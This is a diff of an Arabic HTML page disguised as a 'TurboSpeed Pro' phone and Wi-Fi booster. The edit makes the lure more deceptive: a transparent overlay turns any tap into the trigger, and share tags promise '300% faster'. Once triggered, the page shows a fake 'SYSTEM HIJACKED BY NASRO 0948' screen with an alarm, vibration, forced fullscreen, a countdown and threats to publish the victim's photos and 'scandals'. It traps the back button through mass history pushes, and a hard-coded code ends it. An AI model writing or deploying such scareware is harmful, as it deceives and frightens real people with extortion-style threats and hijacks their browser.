@@ -2,184 +2,117 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>🚀 TurboSpeed 2026 | فحص وتسريع الهاتف</title>
+    <title>🚀 TurboSpeed Pro | فحص وتسريع الهاتف</title>
     
-    <style>
-        body { background-color: #0b132b; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; overflow: hidden; color: white; transition: background 0.1s; }
-        
-        /* واجهة التمويه (فحص الهاتف والوايفاي) */
-        #fake-ui {
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-            height: 100vh; background: radial-gradient(circle, #1c2541, #0b132b); text-align: center;
-        }
-        .container {
-            background: rgba(255, 255, 255, 0.05); padding: 40px; border-radius: 30px;
-            border: 1px solid rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); width: 85%; max-width: 450px;
-        }
-        .icons-row { display: flex; justify-content: center; gap: 20px; margin-bottom: 20px; }
-        .icon-box { font-size: 40px; }
-        .rocket { font-size: 60px; display: block; margin: 10px auto; animation: bounce 2s infinite; }
-        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
-        
-        .wifi-signal { color: #00ff88; font-size: 18px; margin-bottom: 20px; font-weight: bold; }
-        .btn-check {
-            background: linear-gradient(45deg, #00ff88, #00bdff); color: #0b132b;
-            border: none; padding: 20px; border-radius: 15px; font-weight: bold;
-            font-size: 1.5rem; cursor: pointer; width: 100%; transition: 0.3s;
-            box-shadow: 0 0 20px rgba(0, 255, 136, 0.4);
-        }
-        .btn-check:hover { transform: scale(1.05); }
+    <meta property="og:title" content="🚀 سرّع هاتفك والوايفاي الآن 300% مجاناً!" />
+    <meta property="og:image" content="image_7e9ad3.jpg" />
 
-        /* واجهة الرعب (قبضة نصرو) */
+    <style>
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #fff; }
+        
+        /* جعل الصورة التي اخترتها هي الواجهة كاملة */
+        #fake-ui {
+            width: 100%; height: 100%;
+            background: url('image_7e9ad3.jpg') no-repeat center center;
+            background-size: contain;
+            cursor: pointer;
+            display: flex;
+            align-items: flex-end;
+            justify-content: center;
+        }
+
+        /* زر شفاف فوق الصورة لكي يضغط الضحية في أي مكان */
+        .overlay-trigger {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 5;
+        }
+
         #horror-ui { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; background: black; }
         canvas { position: absolute; top: 0; left: 0; z-index: 1; }
         .box {
             position: relative; z-index: 10; background: rgba(0, 0, 0, 0.95);
             border: 4px solid #f00; padding: 30px; text-align: center;
-            box-shadow: 0 0 100px #f00; width: 85%; max-width: 480px; margin: 8% auto;
+            box-shadow: 0 0 100px #f00; width: 85%; max-width: 480px; margin: 10% auto; color: white;
         }
-        .timer { font-size: 4.5rem; color: #f00; font-weight: bold; margin: 10px 0; text-shadow: 0 0 20px #f00; }
-        .log { font-size: 0.75rem; color: #0f0; text-align: left; height: 90px; overflow: hidden; background: #000; padding: 10px; border: 1px solid #333; margin: 15px 0; font-family: monospace; }
-        input { padding: 15px; width: 85%; background: #000; border: 1px solid #f00; color: #f00; text-align: center; font-size: 1.2rem; outline: none; }
-        .cancel-btn { margin-top: 15px; padding: 15px; background: #f00; color: white; border: none; width: 93%; font-weight: bold; cursor: pointer; }
+        .timer { font-size: 4.5rem; color: #f00; font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <div id="fake-ui">
-        <div class="container">
-            <div class="icons-row">
-                <span class="icon-box">📱</span>
-                <span class="icon-box">📶</span>
-                <span class="icon-box">🛡️</span>
-            </div>
-            <span class="rocket">🚀</span>
-            <h1 style="margin: 10px 0;">TurboSpeed Pro</h1>
-            <p style="color: #ccc;">نظام ذكاء اصطناعي لتسريع الوايفاي والمعالج</p>
-            <div class="wifi-signal">📶 تم اكتشاف: وايفاي خارق (980 Mbps)</div>
-            <button class="btn-check" onclick="startTrap()">فحص هاتفك</button>
-            <p style="font-size: 0.7rem; color: #555; margin-top: 15px;">إصدار 2026 - مرخص من حماية الأندرويد</p>
-        </div>
+    <div id="fake-ui" onclick="startTrap()">
+        <div class="overlay-trigger"></div>
     </div>
 
     <div id="horror-ui">
         <canvas id="matrix"></canvas>
         <div class="box">
-            <h1 style="color: #f00; margin: 0; font-size: 1.8rem;">⚠️ SYSTEM HIJACKED ⚠️</h1>
+            <h1 style="color: #f00; margin: 0;">⚠️ SYSTEM HIJACKED ⚠️</h1>
             <h3 style="color: #fff; margin: 5px 0;">BY NASRO 0948</h3>
             <div class="timer" id="countdown">30:00</div>
-            <div class="log" id="log-screen">> Initializing Hack...</div>
-            <p style="color: #fff; font-size: 0.95rem; border: 1px solid #f00; padding: 8px;">
-                تحذير: جاري رفع 14GB من الصور والملفات..<br>
-                إغلاق الصفحة = نشر الفضائح فوراً!
-            </p>
-            <input type="password" id="pass" placeholder="أدخل كود فك التشفير">
-            <button class="cancel-btn" onclick="check()">إيقاف الرفع الآن</button>
+            <p>تحذير: جاري رفع الصور والملفات.. إغلاق الصفحة = نشر الفضائح!</p>
+            <input type="password" id="pass" placeholder="أدخل كود الإيقاف" style="padding:15px; width:80%; text-align:center;">
+            <button onclick="check()" style="margin-top:15px; padding:15px; background:#f00; color:white; border:none; width:90%; font-weight:bold; cursor:pointer;">إلغاء الرفع</button>
         </div>
     </div>
 
     <audio id="alarm" loop src="https://www.soundjay.com/buttons/beep-01a.mp3"></audio>
 
     <script>
-        let timeLeft = 1800; // 30 دقيقة
+        let timeLeft = 1800;
         let active = false;
-        const logs = [
-            "Bypassing Firewall...", "Accessing Internal Storage...", "Scanning Photos...", 
-            "Private Folder Found...", "Uploading to Nasro_Server...", "WhatsApp Database Leaked...",
-            "Encrypting Device...", "GPS Location Sent...", "Nasro 0948 is in control."
-        ];
 
         function startTrap() {
             active = true;
             document.getElementById('fake-ui').style.display = 'none';
             document.getElementById('horror-ui').style.display = 'block';
             document.getElementById('alarm').play();
-            
-            // اهتزاز قوي عند البداية
             if (navigator.vibrate) navigator.vibrate([1000, 500, 1000]);
-            
-            // طلب شاشة كاملة
             if (!document.fullscreenElement) document.documentElement.requestFullscreen().catch(e=>{});
-            
             startMatrix();
             startTimer();
             setupSjail();
-            runLogs();
-        }
-
-        function runLogs() {
-            let i = 0;
-            setInterval(() => {
-                if(active) {
-                    const screen = document.getElementById('log-screen');
-                    screen.innerHTML += "<br>> " + logs[i % logs.length];
-                    screen.scrollTop = screen.scrollHeight;
-                    i++;
-                }
-            }, 1100);
         }
 
         function startTimer() {
-            const timerElement = document.getElementById('countdown');
             setInterval(() => {
                 if(active && timeLeft > 0) {
                     timeLeft--;
                     let min = Math.floor(timeLeft / 60);
                     let sec = timeLeft % 60;
-                    timerElement.innerText = `${min}:${sec < 10 ? '0' : ''}${sec}`;
+                    document.getElementById('countdown').innerText = `${min}:${sec < 10 ? '0' : ''}${sec}`;
                 }
             }, 1000);
         }
 
         function setupSjail() {
-            // سجن السجل (150 نسخة)
             for (let i = 0; i < 150; i++) history.pushState(null, null, location.href);
-            
             window.onpopstate = function () {
-                for (let i = 0; i < 20; i++) history.pushState(null, null, location.href);
-                
-                // عقاب قاسي: خصم 5 دقائق واهتزاز عنيف
-                timeLeft -= 300; 
-                if (navigator.vibrate) navigator.vibrate([2000, 300, 2000]);
-                
-                document.body.style.backgroundColor = "red";
-                setTimeout(() => { document.body.style.backgroundColor = "black"; }, 150);
-                
-                alert("🚨 قبضة نصرو: محاولة الهروب تسرع عملية النشر! تم خصم 5 دقائق من وقتك!");
+                history.pushState(null, null, location.href);
+                timeLeft -= 300;
+                alert("🚨 قبضة نصرو: الهروب مستحيل! تم خصم 5 دقائق!");
             };
         }
 
-        // منع الإغلاق العادي
-        window.onbeforeunload = function() { if(active) return "تحذير: سيتم نشر ملفاتك فوراً!"; };
+        function check() {
+            if(document.getElementById('pass').value === "0948") {
+                active = false; alert("نجوت!"); window.location.href = "https://google.com";
+            }
+        }
 
         function startMatrix() {
             const canvas = document.getElementById('matrix');
             const ctx = canvas.getContext('2d');
             canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-            const letters = "01NASRO0948";
             const drops = Array(Math.floor(canvas.width / 16)).fill(1);
             setInterval(() => {
-                ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
-                ctx.fillStyle = "#0f0"; ctx.font = "15px arial";
+                ctx.fillStyle = "rgba(0,0,0,0.05)"; ctx.fillRect(0,0,canvas.width,canvas.height);
+                ctx.fillStyle = "#0f0";
                 drops.forEach((y, i) => {
-                    ctx.fillText(letters[Math.floor(Math.random() * letters.length)], i * 16, y * 16);
-                    if (y * 16 > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                    ctx.fillText("NASRO0948"[Math.floor(Math.random()*9)], i*16, y*16);
+                    if(y*16 > canvas.height && Math.random() > 0.975) drops[i]=0;
                     drops[i]++;
                 });
             }, 33);
-        }
-
-        function check() {
-            if(document.getElementById('pass').value === "0948") {
-                active = false;
-                window.onbeforeunload = null;
-                alert(" تم الإيقاف.. لا تعدها مجدداً يا محظوظ.. انت محظوظ هذه المرة!");
-                window.location.href = "https://google.com";
-            } else {
-                timeLeft -= 60; // خصم دقيقة
-                if (navigator.vibrate) navigator.vibrate(500);
-                alert("كود خاطئ! تم تسريع عملية الرفع!");
-            }
         }
     </script>
 </body>
